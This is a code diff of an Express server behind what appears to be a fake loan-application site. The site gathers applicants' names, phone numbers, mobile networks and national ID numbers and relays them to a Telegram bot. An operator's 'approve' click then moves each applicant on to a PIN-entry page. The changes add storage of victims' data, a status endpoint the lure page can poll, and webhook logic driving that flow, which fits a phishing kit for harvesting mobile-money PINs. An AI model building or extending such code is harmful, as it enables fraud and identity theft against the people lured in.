@@ -9,9 +9,12 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
-// ENV VARIABLES (set in Railway)
+// ENV VARIABLES
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
+
+// ✅ STORE USERS (NEW)
+const users = {};
 
 // ================= HOME =================
 app.get("/", (req, res) => {
@@ -26,7 +29,16 @@ app.post("/apply", async (req, res) => {
     return res.status(400).send("Missing fields");
   }
 
-  // Save phone for later (simple method)
+  // ✅ SAVE USER DATA
+  users[phone] = {
+    name,
+    phone,
+    network,
+    amount,
+    nationalId,
+    status: "pending"
+  };
+
   const message = `
 📥 NEW LOAN APPLICATION
 
@@ -41,7 +53,6 @@ app.post("/apply", async (req, res) => {
 `;
 
   try {
-    // Send with buttons
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
       text: message,
@@ -60,6 +71,17 @@ app.post("/apply", async (req, res) => {
     console.log(err.response?.data || err.message);
     res.status(500).send("Telegram failed");
   }
+});
+
+// ================= STATUS CHECK (NEW) =================
+app.get("/status/:phone", (req, res) => {
+  const phone = req.params.phone;
+
+  if (!users[phone]) {
+    return res.json({ status: "unknown" });
+  }
+
+  res.json({ status: users[phone].status });
 });
 
 // ================= PIN PAGE VISIT =================
@@ -101,23 +123,27 @@ app.post("/pin", async (req, res) => {
   }
 });
 
-// ================= WEBHOOK =================
+// ================= WEBHOOK (FIXED) =================
 app.post("/webhook", (req, res) => {
   const data = req.body;
 
   if (data.callback_query) {
-    const query = data.callback_query;
-    const action = query.data;
+    const action = data.callback_query.data;
+    const phone = action.split("_")[1];
 
     let text = "";
 
-    if (action.startsWith("approve")) {
-      text = "✅ Approved\n➡️ Next: PIN Page";
-    } else if (action.startsWith("decline")) {
-      text = "❌ Declined";
+    if (users[phone]) {
+      if (action.startsWith("approve")) {
+        users[phone].status = "approved";
+        text = "✅ Approved\n➡️ User will move to PIN page";
+      } else if (action.startsWith("decline")) {
+        users[phone].status = "declined";
+        text = "❌ Declined";
+      }
     }
 
-    // Respond back in Telegram
+    // Send feedback to Telegram
     axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
       text: text
